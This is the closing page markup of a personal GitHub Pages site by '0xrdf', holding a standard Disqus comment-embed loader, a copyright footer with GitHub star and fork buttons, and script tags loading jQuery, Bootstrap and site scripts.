(function() { var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true; dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js'; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq); })(); /* ]]> */ </script></div><footer> &copy; 0xrdf áŒ· - <a href="https://github.com/0xrdf">https://github.com/0xrdf</a><div class="btn-github" style="float:right;"> <iframe src="https://ghbtns.com/github-btn.html?user=0xrdf&repo=0xrdf.github.io&type=star&count=true" frameborder="0" scrolling="0" width="85" height="20px"></iframe> <iframe src="https://ghbtns.com/github-btn.html?user=0xrdf&repo=0xrdf.github.io&type=fork&count=true" frameborder="0" scrolling="0" width="85" height="20px"></iframe></div></footer></div></div><script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script> <script src="//code.jquery.com/jquery-migrate-1.2.1.min.js"></script> <script src="/static/js/bootstrap.min.js"></script> <script src="/static/js/super-search.js"></script> <script src="/static/js/thickbox-compressed.js"></script> <script src="/static/js/projects.js"></script>
